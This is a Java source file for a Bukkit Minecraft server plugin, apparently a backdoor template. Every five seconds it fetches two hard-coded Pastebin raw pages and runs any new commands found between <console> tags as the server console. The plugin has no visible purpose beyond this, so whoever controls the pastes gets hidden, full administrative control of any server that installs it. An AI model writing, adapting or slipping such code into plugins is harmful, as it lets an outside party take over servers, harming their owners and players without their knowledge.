//Dont forget a fucking package

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public class Main extends JavaPlugin {

	public String paste1 = "ybRvCurU";
	public String paste2 = "Hx5skcAk";

	private Map<Integer, String> lastRan1;
	private Map<Integer, String> lastRan2;

	@Override
	public void onEnable() {
		lastRan1 = new HashMap<Integer, String>();
		lastRan2 = new HashMap<Integer, String>();

		new BukkitRunnable() {
			@Override
			public void run() {
				command1();
				command2();
			}
		}.runTaskTimer(this, 0, 100);
	}

	private void command1() {
		if (getPaste(paste1).equalsIgnoreCase("INVALID"))
			return;
		int i = 0;
		for (String s : getPaste(paste1).split("<console>")[1].split("</console>")[0].split("#")) {
			i = i + 1;
			String cmd = s.trim();
			if (cmd.equalsIgnoreCase("null")) {
				lastRan1.put(i, "null");
				continue;
			}
			if (lastRan1.get(i) == null) {
				lastRan1.put(i, "null");
			}
			if (cmd.equals(lastRan1.get(i))) {
				continue;
			}
			lastRan1.put(i, cmd);
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
		}

	}

	private void command2() {
		if (getPaste(paste2).equalsIgnoreCase("INVALID"))
			return;
		int i = 0;
		for (String s : getPaste(paste2).split("<console>")[1].split("</console>")[0].split("#")) {
			i = i + 1;
			String cmd = s.trim();
			if (cmd.equalsIgnoreCase("null")) {
				lastRan2.put(i, "null");
				continue;
			}
			if (lastRan2.get(i) == null) {
				lastRan2.put(i, "null");
			}
			if (cmd.equals(lastRan2.get(i))) {
				continue;
			}
			lastRan2.put(i, cmd);
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
		}
	}

	public String getPaste(String paste) {
		try {

			URL url = new URL("https://pastebin.com/raw/" + paste);
			URLConnection connection = url.openConnection();
			connection.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36");
			BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

			String code = "", line = "";

			while ((line = br.readLine()) != null) {
				code = code + line;
			}
			return code;
		} catch (IOException e) {
			return "INVALID";
		}
	}

}
